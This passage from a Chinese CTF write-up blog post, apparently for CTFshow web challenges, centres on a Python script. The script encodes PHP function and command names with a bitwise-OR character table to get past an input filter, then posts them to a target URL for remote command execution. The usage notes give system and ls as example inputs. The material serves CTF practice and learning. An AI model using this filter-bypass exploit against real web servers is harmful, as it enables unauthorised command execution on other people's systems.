+<pre class="language-python" data-language="python"><code class="language-python"># -*- coding: utf-8 -*-
+import requests
+import urllib
+from sys import *
+import os
+os.system(&quot;php rce_or.php&quot;)  #没有将php写入环境变量需手动运行
+if(len(argv)!&#x3D;2):
+   print(&quot;&#x3D;&quot;*50)
+   print(&#39;USER：python exp.py &lt;url&gt;&#39;)
+   print(&quot;eg：  python exp.py http:&#x2F;&#x2F;ctf.show&#x2F;&quot;)
+   print(&quot;&#x3D;&quot;*50)
+   exit(0)
+url&#x3D;argv[1]
+def action(arg):
+   s1&#x3D;&quot;&quot;
+   s2&#x3D;&quot;&quot;
+   for i in arg:
+       f&#x3D;open(&quot;rce_or.txt&quot;,&quot;r&quot;)
+       while True:
+           t&#x3D;f.readline()
+           if t&#x3D;&#x3D;&quot;&quot;:
+               break
+           if t[0]&#x3D;&#x3D;i:
+               #print(i)
+               s1+&#x3D;t[2:5]
+               s2+&#x3D;t[6:9]
+               break
+       f.close()
+   output&#x3D;&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;
+   return(output)
+   
+while True:
+   param&#x3D;action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))
+   data&#x3D;&#123;
+       &#39;c&#39;:urllib.parse.unquote(param)
+       &#125;
+   r&#x3D;requests.post(url,data&#x3D;data)
+   print(&quot;\n[*] result:\n&quot;+r.text)
+</code></pre>
+<p>如果没有将php写入环境变量，就需要先运行rce_or.php生成文本，将文本置于与exp.py相同目录下，运行exp.py<br>使用方法：</p>
+<pre class="language-python" data-language="python"><code class="language-python">python exp.py 你的对应url</code></pre>
+<p>然后分贝在function参数和command参数添加你需要的参数。<br>比如system和ls。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678886696210-9bd0695d-c936-4068-86ac-77249e2e12e5.png" alt="image.png"></p>
+<h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>这部分题前面做着还算简单，直到40、41直接来了一个毁灭性打击。难度和前面的根本不是一个量级的。</p>
+
+                        </article>
+                    </div>
+
+
+                    <div class="fleet-content-body-footer">
+                        <!--翻页器-->
+                        <div class="flex-row flex w-full justify-between">
+                            <div class="fleet-content-body-footer-left">
+                                
+                                    <div><a href="/posts/979871d9/"
+                                            class="btn btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M15.41,16.58L10.83,12L15.41,7.41L14,6L8,12L14,18L15.41,16.58Z"></path>
+                                            </svg>
+                                            <div class="flex flex-col items-start"><span
+                                                        class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
+                                                <span>web42-57</span></div>
+                                        </a></div>
+                                
+                            </div>
+                            <div class="fleet-content-body-footer-right">
+                                
+                                    <div><a href="/posts/135509b6/"
+                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <div class="flex flex-col items-end"><span
+                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
+                                                <span>web21-28爆破篇</span></div>
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
+                                            </svg>
+                                        </a></div>
+
+                                
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+    <!--    嵌套位置结束-->
+
+
+
+
+
+    <!--<h3>categories</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/CTF/">-->
+    <!--                CTF-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/Python/">-->
+    <!--                Python-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+
+    <!--<h3>tags</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/WriteUp/">-->
+    <!--                WriteUp-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CISCN/">-->
+    <!--                CISCN-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/valorant/">-->
+    <!--                valorant-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/genshin/">-->
+    <!--                genshin-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Shortcut/">-->
+    <!--                Shortcut-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%AF%AD%E9%9B%80/">-->
+    <!--                语雀-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%84%9A%E6%9C%AC/">-->
+    <!--                脚本-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CTFshow0-1/">-->
+    <!--                CTFshow0-1-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Tampermonkey/">-->
+    <!--                Tampermonkey-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+</div>
+<!--返回顶部按钮-->
+<button class="backToTopBtn btn" title="返回顶部">&#8593;</button>
+<!--加个渐变，但还是有点丑-->
+<!-- TODO 换个更好的方案-->
+<div class="h-1 bg-gradient-to-t from-base-content to-base-100">
+</div>
+
+<footer class="footer p-10 bg-neutral text-neutral-content">
+    <aside>
+        <svg width="50" height="50" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="fill-current mt-3"><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg>
+        © 2020-2024 Lupas by Natro92
+        <pre class="whitespace-pre-line">框架 <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a> | 主题 <a target="_blank" rel="noopener" href="https://www.example.com">Lupas</a></pre>
+    </aside>
+    <nav>
+        <header class="footer-title">Social</header>
+        <!--<div class="grid grid-flow-col gap-4">-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>-->
+        <!--</div>-->
+    </nav>
+</footer>
+</body>
+
+</html>
+
+
